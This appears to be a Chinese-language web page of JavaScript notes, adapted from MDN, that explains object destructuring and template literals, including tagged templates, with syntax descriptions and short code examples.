<h4 id="For-of-迭代和解构"><a href="#For-of-迭代和解构" class="headerlink" title="For of 迭代和解构"></a>For of 迭代和解构</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> people = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;Mike Smith&quot;</span>,</span><br><span class="line">    <span class="attr">family</span>: &#123;</span><br><span class="line">      <span class="attr">mother</span>: <span class="string">&quot;Jane Smith&quot;</span>,</span><br><span class="line">      <span class="attr">father</span>: <span class="string">&quot;Harry Smith&quot;</span>,</span><br><span class="line">      <span class="attr">sister</span>: <span class="string">&quot;Samantha Smith&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">35</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;Tom Jones&quot;</span>,</span><br><span class="line">    <span class="attr">family</span>: &#123;</span><br><span class="line">      <span class="attr">mother</span>: <span class="string">&quot;Norah Jones&quot;</span>,</span><br><span class="line">      <span class="attr">father</span>: <span class="string">&quot;Richard Jones&quot;</span>,</span><br><span class="line">      <span class="attr">brother</span>: <span class="string">&quot;Howard Jones&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">25</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: n,</span><br><span class="line">  <span class="attr">family</span>: &#123; <span class="attr">father</span>: f &#125;,</span><br><span class="line">&#125; <span class="keyword">of</span> people) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Name: <span class="subst">$&#123;n&#125;</span>, Father: <span class="subst">$&#123;f&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// &quot;Name: Mike Smith, Father: Harry Smith&quot;</span></span><br><span class="line"><span class="comment">// &quot;Name: Tom Jones, Father: Richard Jones&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="对象属性计算名和解构"><a href="#对象属性计算名和解构" class="headerlink" title="对象属性计算名和解构"></a>对象属性计算名和解构</h4><p>计算属性名，如<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Object_initializer#%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7%E5%90%8D">对象字面量</a>，可以被解构。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> key = <span class="string">&quot;z&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> &#123; [key]: foo &#125; = &#123; <span class="attr">z</span>: <span class="string">&quot;bar&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo); <span class="comment">// &quot;bar&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="无效的-JavaScript-标识符作为属性名称"><a href="#无效的-JavaScript-标识符作为属性名称" class="headerlink" title="无效的 JavaScript 标识符作为属性名称"></a>无效的 JavaScript 标识符作为属性名称</h4><p>通过提供有效的替代标识符，解构可以与不是有效的 JavaScript <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Identifier">标识符</a>的属性名称一起使用。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> foo = &#123; <span class="string">&quot;fizz-buzz&quot;</span>: <span class="literal">true</span> &#125;;</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="string">&quot;fizz-buzz&quot;</span>: fizzBuzz &#125; = foo;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(fizzBuzz); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<h3 id="解构基本类型"><a href="#解构基本类型" class="headerlink" title="解构基本类型"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment#%E8%A7%A3%E6%9E%84%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B">解构基本类型</a></h3><p>对象解构几乎等同于<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Property_accessors">属性访问</a>。这意味着，如果尝试解构基本类型的值，该值将被包装到相应的包装器对象中，并且在包装器对象上访问该属性。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; a, toFixed &#125; = <span class="number">1</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a, toFixed); <span class="comment">// undefined ƒ toFixed() &#123; [native code] &#125;</span></span><br></pre></td></tr></table></figure>

<p>与访问属性相同，解构 <code>null</code> 或 <code>undefined</code> 会抛出 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/TypeError"><code>TypeError</code></a>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const &#123; a &#125; = undefined; // TypeError: Cannot destructure property &#x27;a&#x27; of &#x27;undefined&#x27; as it is undefined.</span><br><span class="line">const &#123; a &#125; = null; // TypeError: Cannot destructure property &#x27;b&#x27; of &#x27;null&#x27; as it is null.</span><br></pre></td></tr></table></figure>

<p>即使模式为空，也会发生这种情况。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;&#125; = <span class="literal">null</span>; <span class="comment">// TypeError: Cannot destructure &#x27;null&#x27; as it is null.</span></span><br></pre></td></tr></table></figure>

<h4 id="组合数组和对象解构"><a href="#组合数组和对象解构" class="headerlink" title="组合数组和对象解构"></a>组合数组和对象解构</h4><p>数组和对象解构可以组合使用。假设你想要下面 <code>props</code> 数组中的第三个元素，然后你想要对象中的 <code>name</code> 属性，你可以执行以下操作：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> props = [</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&quot;Fizz&quot;</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">2</span>, <span class="attr">name</span>: <span class="string">&quot;Buzz&quot;</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">3</span>, <span class="attr">name</span>: <span class="string">&quot;FizzBuzz&quot;</span> &#125;,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> [, , &#123; name &#125;] = props;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(name); <span class="comment">// &quot;FizzBuzz&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="解构对象时查找原型链"><a href="#解构对象时查找原型链" class="headerlink" title="解构对象时查找原型链"></a>解构对象时查找原型链</h4><p>当解构一个对象时，如果属性本身没有被访问，它将沿着原型链继续查找。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  <span class="attr">self</span>: <span class="string">&quot;123&quot;</span>,</span><br><span class="line">  <span class="attr">__proto__</span>: &#123;</span><br><span class="line">    <span class="attr">prot</span>: <span class="string">&quot;456&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> &#123; self, prot &#125; = obj;</span><br><span class="line"><span class="comment">// self &quot;123&quot;</span></span><br><span class="line"><span class="comment">// prot &quot;456&quot; (Access to the prototype chain)</span></span><br></pre></td></tr></table></figure>

<h2 id="规范"><a href="#规范" class="headerlink" title="规范"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment#%E8%A7%84%E8%8C%83">规范</a></h2><p>| Specification                                                |
| ———————————————————— |
| <a href="https://tc39.es/ecma262/multipage/ecmascript-language-expressions.html#sec-destructuring-assignment">ECMAScript Language Specification  # sec-destructuring-assignment</a> |
| <a href="https://tc39.es/ecma262/multipage/ecmascript-language-statements-and-declarations.html#sec-destructuring-binding-patterns">ECMAScript Language Specification  # sec-destructuring-binding-patterns</a> |</p>
<h1 id="模板字符串"><a href="#模板字符串" class="headerlink" title="模板字符串"></a>模板字符串</h1><p><strong>模板字面量</strong>是用反引号（&#96;&#96;&#96;）分隔的字面量，允许<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals#%E5%A4%9A%E8%A1%8C%E5%AD%97%E7%AC%A6%E4%B8%B2">多行字符串</a>、带嵌入表达式的<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8F%92%E5%80%BC">字符串插值</a>和一种叫<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals#%E5%B8%A6%E6%A0%87%E7%AD%BE%E7%9A%84%E6%A8%A1%E6%9D%BF">带标签的模板</a>的特殊结构。</p>
<p>模板字面量有时被非正式地叫作<em>模板字符串</em>，因为它们最常被用作<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8F%92%E5%80%BC">字符串插值</a>（通过替换占位符来创建字符串）。然而，带标签的模板字面量可能不会产生字符串——它可以与自定义<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals#%E5%B8%A6%E6%A0%87%E7%AD%BE%E7%9A%84%E6%A8%A1%E6%9D%BF">标签函数</a>一起使用，来对模板字面量的不同部分执行任何操作。</p>
<h2 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals#%E8%AF%AD%E6%B3%95">语法</a></h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">`string text`</span></span><br><span class="line"></span><br><span class="line"><span class="string">`string text line 1</span></span><br><span class="line"><span class="string"> string text line 2`</span></span><br><span class="line"></span><br><span class="line"><span class="string">`string text <span class="subst">$&#123;expression&#125;</span> string text`</span></span><br><span class="line"></span><br><span class="line">tagFunction<span class="string">`string text <span class="subst">$&#123;expression&#125;</span> string text`</span></span><br></pre></td></tr></table></figure>

<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals#%E5%8F%82%E6%95%B0">参数</a></h3><ul>
<li><p><code>string text</code></p>
<p>​    将成为模板字面量的一部分的字符串文本。几乎允许所有字符，包括<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Lexical_grammar#%E8%A1%8C%E7%BB%88%E6%AD%A2%E7%AC%A6">换行符</a>和其他<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Lexical_grammar#%E7%A9%BA%E7%99%BD%E7%AC%A6">空白字符</a>。但是，除非使用了<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals#%E5%B8%A6%E6%A0%87%E7%AD%BE%E7%9A%84%E6%A8%A1%E7%89%88%E5%AD%97%E9%9D%A2%E9%87%8F%E5%8F%8A%E8%BD%AC%E4%B9%89%E5%BA%8F%E5%88%97">标签函数</a>，否则无效的转义序列将导致语法错误。  </p>
</li>
<li><p><code>expression</code></p>
<p>​    要插入当前位置的表达式，其值被转换为字符串或传递给 <code>tagFunction</code>。  </p>
</li>
<li><p><code>tagFunction</code></p>
<p>​    如果指定，将使用模板字符串数组和替换表达式调用它，返回值将成为模板字面量的值。见<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals#%E5%B8%A6%E6%A0%87%E7%AD%BE%E7%9A%84%E6%A8%A1%E6%9D%BF">带标签的模板</a>。</p>
</li>
</ul>
<h2 id="描述-3"><a href="#描述-3" class="headerlink" title="描述"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals#%E6%8F%8F%E8%BF%B0">描述</a></h2><p>  模板字面量用反引号（&#96;&#96;&#96;）括起来，而不是双引号（<code>&quot;</code>）或单引号（<code>&#39;</code>）。  除了普通字符串外，模板字面量还可以包含*占位符*——一种由美元符号和大括号分隔的嵌入式表达式：<code>$&#123;expression&#125;</code>。字符串和占位符被传递给一个函数（要么是默认函数，要么是自定义函数）。默认函数（当未提供自定义函数时）只执行<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8F%92%E5%80%BC">字符串插值</a>来替换占位符，然后将这些部分拼接到一个字符串中。</p>
<p>若要提供自定义函数，需在模板字面量之前加上函数名（结果被称为<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals#%E5%B8%A6%E6%A0%87%E7%AD%BE%E7%9A%84%E6%A8%A1%E6%9D%BF"><strong>带标签的模板</strong></a>）。此时，模板字面量被传递给你的标签函数，然后就可以在那里对模板文本的不同部分执行任何操作。</p>
<p>若要转义模板字面量中的反引号（&#96;&#96;&#96;），需在反引号之前加一个反斜杠（<code>\</code>）。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">`\``</span> === <span class="string">&quot;`&quot;</span>; <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>美元符号 <code>$</code> 也可以被转义，来阻止插值。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">`\$&#123;1&#125;`</span> === <span class="string">&quot;$&#123;1&#125;&quot;</span>; <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<h3 id="多行字符串"><a href="#多行字符串" class="headerlink" title="多行字符串"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals#%E5%A4%9A%E8%A1%8C%E5%AD%97%E7%AC%A6%E4%B8%B2">多行字符串</a></h3><p>在源码中插入的任何换行符都是模板字面量的一部分。</p>
<p>使用普通字符串，可以通过下面的方式得到多行字符串：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;string text line 1\n&quot;</span> + <span class="string">&quot;string text line 2&quot;</span>);</span><br><span class="line"><span class="comment">// &quot;string text line 1</span></span><br><span class="line"><span class="comment">// string text line 2&quot;</span></span><br></pre></td></tr></table></figure>

<p>使用模板字面量，下面的代码同样可以做到：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`string text line 1</span></span><br><span class="line"><span class="string">string text line 2`</span>);</span><br><span class="line"><span class="comment">// &quot;string text line 1</span></span><br><span class="line"><span class="comment">// string text line 2&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="字符串插值"><a href="#字符串插值" class="headerlink" title="字符串插值"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8F%92%E5%80%BC">字符串插值</a></h3><p>如果没有模板字面量，当你想组合表达式的输出与字符串时，可以使用<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Addition">加法运算符 <code>+</code></a> <a href="https://developer.mozilla.org/zh-CN/docs/Learn/JavaScript/First_steps/Strings#%E8%BF%9E%E6%8E%A5%E5%AD%97%E7%AC%A6%E4%B8%B2">连接它们</a>：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> a = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">const</span> b = <span class="number">10</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Fifteen is &quot;</span> + (a + b) + <span class="string">&quot; and\nnot &quot;</span> + (<span class="number">2</span> * a + b) + <span class="string">&quot;.&quot;</span>);</span><br><span class="line"><span class="comment">// &quot;Fifteen is 15 and</span></span><br><span class="line"><span class="comment">// not 20.&quot;</span></span><br></pre></td></tr></table></figure>

<p>这可能很难阅读，尤其是当存在多个表达式时。</p>
<p>有了模板字面量，就可以通过使用占位符 <code>$&#123;expression&#125;</code> 嵌入待替换的表达式，从而避免串联运算符，并提高代码的可读性：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> a = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">const</span> b = <span class="number">10</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Fifteen is <span class="subst">$&#123;a + b&#125;</span> and</span></span><br><span class="line"><span class="string">not <span class="subst">$&#123;<span class="number">2</span> * a + b&#125;</span>.`</span>);</span><br><span class="line"><span class="comment">// &quot;Fifteen is 15 and</span></span><br><span class="line"><span class="comment">// not 20.&quot;</span></span><br></pre></td></tr></table></figure>

<p>注意，这两种语法有一点小区别：模板字面量直接将其表达式<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%BC%BA%E5%88%B6%E8%BD%AC%E6%8D%A2">强制转换为字符串</a>，而加法则会先强制转换为原语类型。更多相关信息，参见<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Addition">加法（<code>+</code>）运算符</a>。</p>
<h3 id="嵌套模板"><a href="#嵌套模板" class="headerlink" title="嵌套模板"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals#%E5%B5%8C%E5%A5%97%E6%A8%A1%E6%9D%BF">嵌套模板</a></h3><p>在某些情况下，嵌套模板是具有可配置字符串的最简单的（也许还是更可读的）方法。在反引号分隔的模板中，允许在占位符 <code>$&#123;expression&#125;</code> 中使用内层的反引号。</p>
<p>例如，不用模板字面量的情况下，如果你想根据特定条件返回某个值，可以执行以下操作：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> classes = <span class="string">&quot;header&quot;</span>;</span><br><span class="line">classes += <span class="title function_">isLargeScreen</span>()</span><br><span class="line">  ? <span class="string">&quot;&quot;</span></span><br><span class="line">  : item.<span class="property">isCollapsed</span></span><br><span class="line">  ? <span class="string">&quot; icon-expander&quot;</span></span><br><span class="line">  : <span class="string">&quot; icon-collapser&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>用模板字面量但不嵌套时，你可以这么做：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> classes = <span class="string">`header <span class="subst">$&#123;</span></span></span><br><span class="line"><span class="subst"><span class="string">  isLargeScreen() ? <span class="string">&quot;&quot;</span> : item.isCollapsed ? <span class="string">&quot;icon-expander&quot;</span> : <span class="string">&quot;icon-collapser&quot;</span></span></span></span><br><span class="line"><span class="subst"><span class="string">&#125;</span>`</span>;</span><br></pre></td></tr></table></figure>

<p>用嵌套模板字面量时，你可以这么做：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> classes = <span class="string">`header <span class="subst">$&#123;</span></span></span><br><span class="line"><span class="subst"><span class="string">  isLargeScreen() ? <span class="string">&quot;&quot;</span> : <span class="string">`icon-<span class="subst">$&#123;item.isCollapsed ? <span class="string">&quot;expander&quot;</span> : <span class="string">&quot;collapser&quot;</span>&#125;</span>`</span></span></span></span><br><span class="line"><span class="subst"><span class="string">&#125;</span>`</span>;</span><br></pre></td></tr></table></figure>

<h3 id="带标签的模板"><a href="#带标签的模板" class="headerlink" title="带标签的模板"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals#%E5%B8%A6%E6%A0%87%E7%AD%BE%E7%9A%84%E6%A8%A1%E6%9D%BF">带标签的模板</a></h3><p><em>带标签的</em>模板是模板字面量的一种更高级的形式，它允许你使用函数解析模板字面量。标签函数的第一个参数包含一个字符串数组，其余的参数与表达式相关。你可以用标签函数对这些参数执行任何操作，并返回被操作过的字符串（或者，也可返回完全不同的内容，见下面的示例）。用作标签的函数名没有限制。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> person = <span class="string">&quot;Mike&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> age = <span class="number">28</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">myTag</span>(<span class="params">strings, personExp, ageExp</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> str0 = strings[<span class="number">0</span>]; <span class="comment">// &quot;That &quot;</span></span><br><span class="line">  <span class="keyword">const</span> str1 = strings[<span class="number">1</span>]; <span class="comment">// &quot; is a &quot;</span></span><br><span class="line">  <span class="keyword">const</span> str2 = strings[<span class="number">2</span>]; <span class="comment">// &quot;.&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> ageStr = ageExp &gt; <span class="number">99</span> ? <span class="string">&quot;centenarian&quot;</span> : <span class="string">&quot;youngster&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 我们甚至可以返回使用模板字面量构建的字符串</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;str0&#125;</span><span class="subst">$&#123;personExp&#125;</span><span class="subst">$&#123;str1&#125;</span><span class="subst">$&#123;ageStr&#125;</span><span class="subst">$&#123;str2&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> output = myTag<span class="string">`That <span class="subst">$&#123;person&#125;</span> is a <span class="subst">$&#123;age&#125;</span>.`</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(output);</span><br><span class="line"><span class="comment">// That Mike is a youngster.</span></span><br></pre></td></tr></table></figure>

<p>标签不必是普通的标识符，你可以使用任何<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Operator_precedence#%E6%B1%87%E6%80%BB%E8%A1%A8">优先级</a>大于 16 的表达式，包括<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Property_accessors">属性访问</a>、函数调用、<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/new">new 表达式</a>，甚至其他带标签的模板字面量。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="property">log</span><span class="string">`Hello`</span>; <span class="comment">// [ &#x27;Hello&#x27; ]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="property">log</span>.<span class="title function_">bind</span>(<span class="number">1</span>, <span class="number">2</span>)<span class="string">`Hello`</span>; <span class="comment">// 2 [ &#x27;Hello&#x27; ]</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Function</span>(<span class="string">&quot;console.log(arguments)&quot;</span>)<span class="string">`Hello`</span>; <span class="comment">// [Arguments] &#123; &#x27;0&#x27;: [ &#x27;Hello&#x27; ] &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">recursive</span>(<span class="params">strings, ...values</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(strings, values);</span><br><span class="line">  <span class="keyword">return</span> recursive;</span><br><span class="line">&#125;</span><br><span class="line">recursive<span class="string">`Hello`</span><span class="string">`World`</span>;</span><br><span class="line"><span class="comment">// [ &#x27;Hello&#x27; ] []</span></span><br><span class="line"><span class="comment">// [ &#x27;World&#x27; ] []</span></span><br></pre></td></tr></table></figure>

<p>虽然语法从技术上允许这么做，但<em>不带标签的</em>模板字面量是字符串，并且在链式调用时会抛出 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/TypeError"><code>TypeError</code></a>。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Hello`</span><span class="string">`World`</span>); <span class="comment">// TypeError: &quot;Hello&quot; is not a function</span></span><br></pre></td></tr></table></figure>

<p>唯一的例外是可选链，这将抛出语法错误。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="property">log</span>?.<span class="string">`Hello`</span>; <span class="comment">// SyntaxError: Invalid tagged template on optional chain</span></span><br><span class="line"><span class="variable language_">console</span>?.<span class="property">log</span><span class="string">`Hello`</span>; <span class="comment">// SyntaxError: Invalid tagged template on optional chain</span></span><br></pre></td></tr></table></figure>

<p>请注意，这两个表达式仍然是可解析的。这意味着它们将不受<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Lexical_grammar#%E8%87%AA%E5%8A%A8%E5%88%86%E5%8F%B7%E8%A1%A5%E5%85%A8">自动分号补全</a>的影响，其只会插入分号来修复无法解析的代码。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 仍是语法错误</span></span><br><span class="line"><span class="keyword">const</span> a = <span class="variable language_">console</span>?.<span class="property">log</span></span><br><span class="line"><span class="string">`Hello`</span></span><br></pre></td></tr></table></figure>

<p>标签函数甚至不需要返回字符串！</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">template</span>(<span class="params">strings, ...keys</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function">(<span class="params">...values</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> dict = values[values.<span class="property">length</span> - <span class="number">1</span>] || &#123;&#125;;</span><br><span class="line">    <span class="keyword">const</span> result = [strings[<span class="number">0</span>]];</span><br><span class="line">    keys.<span class="title function_">forEach</span>(<span class="function">(<span class="params">key, i</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> value = <span class="title class_">Number</span>.<span class="title function_">isInteger</span>(key) ? values[key] : dict[key];</span><br><span class="line">      result.<span class="title function_">push</span>(value, strings[i + <span class="number">1</span>]);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> result.<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> t1Closure = template<span class="string">`<span class="subst">$&#123;<span class="number">0</span>&#125;</span><span class="subst">$&#123;<span class="number">1</span>&#125;</span><span class="subst">$&#123;<span class="number">0</span>&#125;</span>!`</span>;</span><br><span class="line"><span class="comment">// const t1Closure = template([&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;!&quot;],0,1,0);</span></span><br><span class="line"><span class="title function_">t1Closure</span>(<span class="string">&quot;Y&quot;</span>, <span class="string">&quot;A&quot;</span>); <span class="comment">// &quot;YAY!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> t2Closure = template<span class="string">`<span class="subst">$&#123;<span class="number">0</span>&#125;</span> <span class="subst">$&#123;<span class="string">&quot;foo&quot;</span>&#125;</span>!`</span>;</span><br><span class="line"><span class="comment">// const t2Closure = template([&quot;&quot;,&quot; &quot;,&quot;!&quot;],0,&quot;foo&quot;);</span></span><br><span class="line"><span class="title function_">t2Closure</span>(<span class="string">&quot;Hello&quot;</span>, &#123; <span class="attr">foo</span>: <span class="string">&quot;World&quot;</span> &#125;); <span class="comment">// &quot;Hello World!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> t3Closure = template<span class="string">`I&#x27;m <span class="subst">$&#123;<span class="string">&quot;name&quot;</span>&#125;</span>. I&#x27;m almost <span class="subst">$&#123;<span class="string">&quot;age&quot;</span>&#125;</span> years old.`</span>;</span><br><span class="line"><span class="comment">// const t3Closure = template([&quot;I&#x27;m &quot;, &quot;. I&#x27;m almost &quot;, &quot; years old.&quot;], &quot;name&quot;, &quot;age&quot;);</span></span><br><span class="line"><span class="title function_">t3Closure</span>(<span class="string">&quot;foo&quot;</span>, &#123; <span class="attr">name</span>: <span class="string">&quot;MDN&quot;</span>, <span class="attr">age</span>: <span class="number">30</span> &#125;); <span class="comment">// &quot;I&#x27;m MDN. I&#x27;m almost 30 years old.&quot;</span></span><br><span class="line"><span class="title function_">t3Closure</span>(&#123; <span class="attr">name</span>: <span class="string">&quot;MDN&quot;</span>, <span class="attr">age</span>: <span class="number">30</span> &#125;); <span class="comment">// &quot;I&#x27;m MDN. I&#x27;m almost 30 years old.&quot;</span></span><br></pre></td></tr></table></figure>

<p>标签函数接收到的第一个参数是一个字符串数组。对于任何模板字面量，其长度等于替换次数（<code>$&#123;…&#125;</code> 出现次数）加一，因此总是非空的。对于任何特定的带标签的模板字面量表达式，无论对字面量求值多少次，都将始终使用完全相同的字面量数组调用标签函数。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> callHistory = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">tag</span>(<span class="params">strings, ...values</span>) &#123;</span><br><span class="line">  callHistory.<span class="title function_">push</span>(strings);</span><br><span class="line">  <span class="comment">// Return a freshly made object</span></span><br><span class="line">  <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">evaluateLiteral</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> tag<span class="string">`Hello, <span class="subst">$&#123;<span class="string">&quot;world&quot;</span>&#125;</span>!`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(evaluateLiteral() === evaluateLiteral()); <span class="comment">// false; each time `tag` is called, it returns a new object</span></span><br><span class="line"><span class="variable 